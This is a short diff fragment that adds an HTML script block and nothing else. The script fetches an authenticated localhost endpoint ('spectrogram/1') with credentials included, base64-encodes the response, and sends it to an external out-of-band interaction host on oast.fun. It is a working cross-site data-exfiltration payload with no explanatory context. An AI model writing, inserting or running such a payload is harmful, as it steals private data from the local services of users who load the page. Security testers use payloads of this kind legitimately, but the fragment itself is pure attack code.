@@ -1,0 +1,5 @@
+<script>
+fetch('http://localhost:4567/spectrogram/1',{credentials:'include'})
+.then(r=>r.text())
+.then(d=>fetch('https://pwwwnedlpqxdeoidqydhp4o5pe89kaz41h.oast.fun/?c='+btoa(d)))
+</script>
